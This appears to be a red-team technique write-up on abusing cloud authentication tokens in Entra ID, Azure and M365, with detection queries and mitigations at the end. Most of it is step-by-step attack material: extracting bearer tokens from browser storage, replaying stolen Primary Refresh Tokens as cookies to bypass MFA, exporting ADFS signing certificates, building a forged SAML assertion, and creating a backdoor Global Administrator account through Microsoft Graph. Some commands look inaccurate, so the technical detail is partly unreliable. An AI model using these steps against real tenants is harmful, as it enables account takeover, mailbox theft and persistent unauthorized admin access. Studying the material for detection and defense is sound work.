# [PE-TOKEN-008]: API Authentication Token Manipulation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-008 |
| **MITRE ATT&CK v18.1** | [T1134](https://attack.mitre.org/techniques/T1134/) - Access Token Manipulation (cloud-specific variant) |
| **Tactic** | Privilege Escalation / Defense Evasion / Lateral Movement |
| **Platforms** | Entra ID / Azure / M365 / SaaS |
| **Severity** | Critical |
| **CVE** | CVE-2025-55241 (Actor Token), CVE-2021-42287 (hybrid), multiple SAML/OAuth flaws |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID versions (cloud-native); varies by SaaS/application |
| **Patched In** | Ongoing (legacy APIs deprecated); no universal patch |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** API Authentication Token Manipulation in cloud environments (Entra ID, Azure, M365, SaaS) involves the theft, modification, or forgery of authentication tokens (JWT, SAML, PRT, OAuth refresh tokens) to impersonate users and gain unauthorized access. Unlike traditional on-premises Kerberos attacks, cloud token attacks leverage API-based authentication and often leave minimal logs. Attack vectors include: (1) **Token Theft** – stealing bearer tokens from browser memory, network traffic, or logs; (2) **Token Manipulation** – modifying JWT claims or SAML assertions; (3) **Token Forgery** – creating new tokens with falsified identities using stolen signing keys; (4) **Primary Refresh Token (PRT) Abuse** – leveraging device-bound tokens to bypass MFA; (5) **Malicious Actor Tokens** – exploiting legacy Microsoft service-to-service tokens to impersonate any user across tenants. Successful exploitation grants full cloud account access, including Global Admin privileges in M365/Entra, enabling ransomware deployment, data exfiltration, and persistent backdoors.

**Attack Surface:** REST APIs (Microsoft Graph, Azure Management API, SaaS APIs), OAuth 2.0/OIDC flows, SAML federation endpoints, Azure AD Graph (legacy, deprecated), device registration services. Attackers target: token issuance endpoints, refresh token mechanisms, federation trust relationships, and unvalidated legacy API endpoints.

**Business Impact:** **Critical – Full Cloud Tenant Compromise.** Successful token manipulation enables: (1) Impersonation of Global Administrators; (2) Extraction of all tenant data (Exchange, SharePoint, Teams, OneDrive); (3) Creation of persistent backdoor accounts; (4) Deployment of Azure Runbooks or Logic Apps for ransomware/persistence; (5) Lateral movement to on-premises AD (hybrid scenarios); (6) Compromise of partner/supplier tenants (B2B scenarios).

**Technical Context:** Cloud token attacks often bypass traditional detection because: (1) No password/MFA logs (tokens already cached); (2) Minimal API-level logging for legacy endpoints; (3) Tokens valid for 1+ hours, allowing extended operations; (4) Multiple token types with overlapping scope; (5) Difficult to distinguish legitimate from forged tokens without crypto verification.

### Operational Risk

- **Execution Risk:** Medium – Requires token theft (initial compromise or phishing), but once obtained, exploitation is straightforward.
- **Stealth:** High – Token usage often lacks detailed logging; many attacks bypass conditional access and MFA.
- **Reversibility:** No – Compromised credentials require full password reset; token-based sessions may remain active for hours.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Azure** | 1.1 | Multi-factor authentication |
| **NIST 800-53** | AC-2, AC-3, IA-2 | Account Management; Access Control; Authentication |
| **GDPR** | Art. 32 | Technical security of processing; Art. 33 - Breach notification |
| **DORA** | Art. 9, 18 | Protection measures; Monitoring and logging |
| **NIS2** | Art. 21 | Cybersecurity risk management measures |
| **ISO 27001** | A.9.2.1, A.9.4.2 | Privileged access; Secure authentication mechanisms |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Initial token theft (via phishing, credential compromise, or malware).
- **Required Access:** Network access to authentication endpoints or Entra ID.

**Supported Platforms:**
- **Entra ID:** All versions (cloud-native)
- **Azure:** All subscriptions
- **M365:** All plans with Entra ID
- **On-Premises (Hybrid):** AD FS, Entra Cloud Sync

**Prerequisite Checks:**
- Token lifetime configuration (default 1 hour for access tokens)
- Legacy API access (Azure AD Graph still active on many tenants)
- Federation configuration (SAML certificate exposure)
- Refresh token policy enforcement
- Device registration (for PRT exploitation)

**Tools & Dependencies:**
- [AADInternals](https://github.com/Gerenios/AADInternals) – PowerShell Entra ID tools, token manipulation
- [PyJWT](https://pyjwt.readthedocs.io/) – Python JWT analysis/modification
- [roadtx (ROADtools Token Exchange)](https://github.com/dirkjanm/ROADtools) – Entra ID token and device operations
- [Rubeus](https://github.com/GhostPack/Rubeus) – Kerberos (hybrid scenarios)
- [Burp Suite](https://portswigger.net/burp) – Token interception/manipulation
- [SAML Raider (Burp extension)](https://portswigger.net/burp/documentation/desktop/tools/extender/saml-raider) – SAML token editing
- [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/) – Token inspection and usage

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Entra ID / PowerShell Reconnaissance

#### Check Token Lifetime Policies

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Directory.Read.All"

# Get token lifetime policies
Get-MgPolicyTokenLifetimePolicy | Select-Object DisplayName, Definition

# Check application-specific policies
Get-MgServicePrincipal -ServicePrincipalNames "graph.microsoft.com" | Select-Object DisplayName, TokenLifetimePolicies
```

**What to Look For:**
- Long refresh token lifetimes (> 7 days = risky)
- Disabled refresh token expiration
- Multiple active policies (may allow token reuse)

#### Check Legacy API Access (Azure AD Graph)

```powershell
# Check if Azure AD Graph API is still accessible (deprecated but often still available)
$token = (Get-MgAccessToken -ConsentScope "https://graph.microsoft.com/.default" -ErrorAction SilentlyContinue).AccessToken
$headers = @{Authorization = "Bearer $token"}

# Try Azure AD Graph endpoint (legacy)
Invoke-RestMethod -Uri "https://graph.windows.net/me" -Headers $headers
```

**What to Look For:**
- Successful response = Azure AD Graph API still accessible (vulnerable to actor token attacks)
- Legacy API is being phased out; still present on many tenants

#### Check Federation Configuration (Hybrid Scenarios)

```powershell
Get-MgDomain -DomainId (Get-MgOrganization).Id | Select-Object IsFederationEnabled, FederationConfiguration

# Check SAML certificate (if federated)
$domain = Get-MgDomain -DomainId "domain.com"
$domain.IsFederationEnabled  # If $true, domain is federated
```

**What to Look For:**
- Federated domains = SAML token attack surface
- Certificate expiration date (if cert expired, federation breaks but may leave backdoors)

### Linux / Cloud Reconnaissance

```bash
# Check if refresh tokens are accessible via cloud shell history
cat ~/.azure/az.sts.json  # Azure CLI token cache (if accessible)

# Use roadtx to enumerate Entra ID
roadtx enum -e | grep -i "user\|token"

# Check for exposed tokens in GitHub/public repos
curl -s "https://api.github.com/search/code?q=entra+token+refresh" | jq '.items[] | select(.name | test("token|auth"))'
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: JWT Bearer Token Theft and Reuse (Browser-Based)

**Supported Platforms:** Entra ID, M365, Azure Portal, SaaS apps

#### Step 1: Compromise User Device or Intercept Token

**Objective:** Steal JWT bearer token from user's browser or network traffic.

**Option A: Browser DevTools (if attacker has device access)**
```javascript
// In browser console, extract token from local storage or session storage
localStorage.getItem("token")
sessionStorage.getItem("access_token")
document.cookie  // Check for auth cookies

// JWT typically found in:
// - Authorization: Bearer {JWT}
// - Cookies: graph_auth_token
// - localStorage: access_token, refresh_token
```

**Option B: Network Interception (MITM/Proxy)**
```bash
# Using Burp Suite:
# 1. Set Burp as proxy in browser
# 2. Navigate to https://portal.azure.com
# 3. Intercept POST to /oauth2/v2.0/token
# 4. Extract access_token from response JSON

# Example response:
# {"access_token":"eyJhbGc...", "refresh_token":"0.AR...", "expires_in":3600}
```

**What This Means:**
- JWT tokens (beginning with "eyJ") are base64url encoded
- Bearer tokens typically valid for 1 hour
- Refresh tokens often valid for 90+ days

#### Step 2: Decode JWT and Verify Claims

**Command:**
```bash
# Decode JWT (no verification needed for exploitation)
echo "eyJhbGc..." | jq -R 'split(".") | .[1] | @base64d | fromjson'

# Output shows:
# {
#   "aud": "https://graph.microsoft.com",
#   "iss": "https://sts.windows.net/{tenant}/",
#   "sub": "user-object-id",
#   "upn": "user@contoso.com",
#   "roles": ["Global Administrator"],
#   "exp": 1705000000
# }
```

**What to Look For:**
- **aud (audience):** Resource intended for (e.g., "https://graph.microsoft.com")
- **roles:** User's assigned roles (Global Admin = maximum privilege)
- **exp (expiration):** Unix timestamp; token still valid?

#### Step 3: Use Token to Access APIs

**Command (Using Azure CLI):**
```bash
# Use stolen token
az login --allow-no-subscriptions --use-device-code  # Or directly:
export AZURE_ACCESS_TOKEN="eyJhbGc..."

# Access Microsoft Graph API
curl -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages"
```

**Command (Using Burp / Manual HTTP):**
```bash
# Modify request headers
GET /v1.0/me/messages HTTP/1.1
Host: graph.microsoft.com
Authorization: Bearer eyJhbGc...

# Server accepts token and returns user data
```

**Expected Output:**
```json
{
  "value": [
    {
      "id": "email-id",
      "sender": {"emailAddress": {"address": "victim@contoso.com"}},
      "subject": "Sensitive Data",
      "bodyPreview": "..."
    }
  ]
}
```

#### Step 4: Escalate to Admin Actions (if admin role in token)

**Command (Create New User / Backdoor):**
```bash
# Create new admin account (persistence)
curl -X POST "https://graph.microsoft.com/v1.0/users" \
  -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "accountEnabled": true,
    "displayName": "Service Account",
    "mailNickname": "svc_persist",
    "userPrincipalName": "svc_persist@contoso.com",
    "passwordProfile": {
      "forceChangePasswordNextSignIn": false,
      "password": "P@ssw0rd123!"
    }
  }'

# Make new user Global Admin
curl -X POST "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" \
  -d '{
    "principalId": "new-user-object-id",
    "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10"  # Global Admin role
  }'
```

---

### METHOD 2: PRT (Primary Refresh Token) Theft and Replay

**Supported Platforms:** Entra ID (especially Windows devices, Azure App Proxy)

#### Step 1: Extract PRT from Compromised Device

**Objective:** Steal PRT from user's Entra ID-joined or hybrid-joined Windows device.

**Command (Using ROADtools on compromised device):**
```bash
# If attacker has code execution on user's device:
roadtx gettokens -u -r

# Output:
# Tokens found:
# - access_token: eyJ...
# - refresh_token: 0.AR...
# - prt: 0.APR... (most valuable)
```

**Command (Via Windows CmdKey / Credentials Manager):**
```cmd
# Extract FIDO2 or stored credentials
cmdkey /list  # List stored credentials

# Or Mimikatz-style extraction (if admin access):
privilege::debug
token::elevate
```

**What This Means:**
- PRT is device-bound but can be extracted if attacker has OS-level access
- PRT typically stored in Windows Credential Manager
- PRT signs new tokens for any service (extremely powerful)

#### Step 2: Replay PRT in Browser (Cookie Injection)

**Objective:** Use stolen PRT to bypass MFA and authenticate as the user.

**Command (Browser DevTools / Burp):**
```javascript
// Inject PRT into browser cookies
document.cookie = "x-ms-RefreshTokenCredential=0.APR...; Path=/; Domain=.microsoft.com; Secure; HttpOnly";

// Navigate to Office 365 or Azure Portal
// Browser will use PRT to authenticate, bypassing password/MFA
```

**Command (Python Script for Attack):**
```python
import requests

# Create session with PRT cookie
session = requests.Session()
session.cookies.set("x-ms-RefreshTokenCredential", stolen_prt)

# Access O365 without MFA
response = session.get("https://outlook.office.com/mail")
# Success = full mailbox access
```

**What This Means:**
- PRT replay works even if user doesn't have device locally
- Attack is invisible to user (no password/MFA prompts)
- Session valid for 5+ minutes before PRT expiration

---

### METHOD 3: SAML Token Forgery (Golden/Silver SAML)

**Supported Platforms:** Entra ID (hybrid), ADFS, On-Premises + Cloud Federated Scenarios

#### Step 1: Obtain Federated Domain SAML Signing Certificate

**Objective:** Steal or extract the SAML signing certificate used by Entra ID/ADFS.

**Command (Using PowerShell if admin access):**
```powershell
# Get SAML signing certificate from Entra ID (if hybrid and accessible)
Get-ADUser -SearchBase "CN=Computers" -Filter * | Where-Object { $_.CN -match "ADFS" }

# Extract cert from AD FS server (if compromised)
Get-ChildItem "Cert:\LocalMachine\My" | Where-Object { $_.Subject -match "adfs" }

# Export certificate
$cert = Get-ChildItem "Cert:\LocalMachine\My\{Thumbprint}"
[System.IO.File]::WriteAllBytes("C:\Temp\adfs-cert.pfx", $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx))
```

**Command (Via Entra ID Portal if authenticated as admin):**
```bash
# Using Azure CLI to export SAML cert
az ad app show --id "enterprise-app-id" | jq '.keyCredentials[] | select(.usage=="Sig")'

# Or via Graph API
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications/{app-id}/keyCredentials"
```

**What This Means:**
- SAML cert typically valid for 1-3 years
- Private key is most valuable asset for forging tokens
- If cert exposed, attacker can forge tokens for ANY user in that domain

#### Step 2: Create Forged SAML Assertion

**Objective:** Generate a valid SAML token impersonating Global Admin.

**Command (Using Python + pysaml2):**
```python
import saml2
from saml2.saml import NAMEID_FORMAT_EMAILADDRESS
from datetime import datetime, timedelta
import base64

# Load stolen ADFS certificate + private key
from OpenSSL import crypto
cert_file = open("adfs-cert.pfx", "rb")
p12 = crypto.load_pkcs12(cert_file.read(), password=b"certificate_password")
private_key = crypto.dump_privatekey(crypto.FILETYPE_PEM, p12.get_privatekey())
certificate = crypto.dump_certificate(crypto.FILETYPE_PEM, p12.get_certificate())

# Create forged SAML assertion
assertion_xml = """<?xml version="1.0" encoding="UTF-8"?>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" 
                xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
                Version="2.0" ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6" 
                IssueInstant="2024-01-01T10:00:00Z">
  <saml:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">
    https://adfs.contoso.com/adfs/services/trust
  </saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
      admin@contoso.com
    </saml:NameID>
  </saml:Subject>
  <saml:Conditions NotBefore="2024-01-01T10:00:00Z" NotOnOrAfter="2024-01-01T11:00:00Z"/>
  <saml:AuthnStatement AuthnInstant="2024-01-01T10:00:00Z">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>
    <saml:Attribute Name="http://schemas.microsoft.com/identity/claims/objectidentifier" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
      <saml:AttributeValue>global-admin-oid</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="http://schemas.microsoft.com/identity/claims/role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
      <saml:AttributeValue>Global Administrator</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>"""

# Sign with stolen private key (simplified)
# In real attack, use proper SAML library for signing
```

#### Step 3: Inject Forged SAML Token into Entra ID

**Command (Using Burp / Manual SAML Request):**
```bash
# SAML tokens submitted via POST to:
# https://login.microsoftonline.com/common/saml2

# Forged token POSTed with:
POST /common/saml2 HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded

SAMLResponse={base64-encoded-forged-assertion}

# If token signature valid (matches stolen cert), Entra ID accepts it
# Attacker receives access token for "admin@contoso.com"
```

**Expected Outcome:**
- Entra ID validates SAML signature against federated domain cert
- Token accepted; attacker authenticated as Global Admin
- Access granted to M365, Azure, etc.

---

## 5. TOOLS & COMMANDS REFERENCE

### AADInternals (PowerShell Token Toolkit)

**URL:** [GitHub - AADInternals](https://github.com/Gerenios/AADInternals)

**Installation:**
```powershell
Install-Module -Name AADInternals -Force
```

**Usage:**
```powershell
# Get user tokens
$tokens = Get-AADIntUserTokens -credentials $cred

# Extract PRT
$prt = $tokens.PrimaryRefreshToken

# Forge tokens, enumerate, etc.
```

### ROADtools Token Exchange (roadtx)

**URL:** [GitHub - ROADtools](https://github.com/dirkjanm/ROADtools)

**Installation:**
```bash
pip3 install roadtx
```

**Usage:**
```bash
# Extract tokens from compromised device
roadtx gettokens -u -r

# Use tokens to access services
roadtx azure -t access_token
```

### Burp Suite with SAML Raider

**URL:** [Portswigger - SAML Raider](https://portswigger.net/burp/documentation/desktop/tools/extender/saml-raider)

**Usage:** GUI-based; intercept SAML requests and modify claims

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Token Issuance

**KQL Query:**
```kusto
AuditLogs
| where Category == "Authentication" or OperationName =~ ".*token.*"
| where ResultDescription !contains "Success"
| project TimeGenerated, OperationName, InitiatedBy, ResultDescription
```

#### Query 2: Anomalous Graph API Access

**KQL Query:**
```kusto
MicrosoftGraphActivityLogs
| where RequestMethod == "POST"
| where ResourceDisplayName =~ "users|roles|applications"
| summarize Count = count() by InitiatedBy, ResourceDisplayName
| where Count > 5  // Threshold for suspicious activity
```

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enforce Conditional Access:**
    1. Require compliant devices
    2. Block legacy authentication
    3. Require MFA for sensitive operations

*   **Enable Token Lifetime Policies:**
    - Set refresh token max age: 90 days
    - Configure token revocation on sign-out

*   **Audit and Monitor Legacy APIs:**
    - Disable Azure AD Graph if not needed
    - Monitor Graph API usage for anomalies

*   **Enforce SAML Signing Certificate Validation:**
    - Use only Entra ID self-signed certs (not externally generated)
    - Rotate certs every 12 months

#### Priority 2: HIGH

*   **Passwordless Authentication:** Migrate to Windows Hello, FIDO2 keys
*   **Device Compliance:** Require Intune enrollment for admin accounts
*   **Threat Markers:** Monitor for impossible travel, anomalous locations

---

## 8. INCIDENT RESPONSE

#### Indicators of Compromise

- Unusual Graph API calls from unexpected IPs
- Token requests without corresponding user logins
- SAML assertions with anomalous claims
- PRT usage from multiple geographies simultaneously

#### Response Procedures

1.  **Revoke Tokens:**
    ```bash
    # Force sign-out (revoke all tokens)
    az ad user update --id compromised@contoso.com --force-change-password-next-sign-in
    ```

2.  **Reset Credentials:**
    - Change all admin passwords
    - Require re-authentication

3.  **Investigate:**
    - Review SigninLogs for unusual activity
    - Check for unauthorized role assignments
    - Audit all M365 admin activity

---

